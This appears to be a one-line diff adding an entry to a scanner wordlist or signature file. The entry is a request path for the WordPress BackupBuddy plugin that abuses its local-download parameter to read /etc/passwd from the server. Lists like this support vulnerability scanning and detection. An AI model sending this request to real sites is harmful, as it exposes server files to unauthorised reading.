@@ -1,0 +1,1 @@
+/wp-admin/admin-post.php?page=pb_backupbuddy_destinations&local-destination-id=/etc/passwd&local-download=/etc/passwd
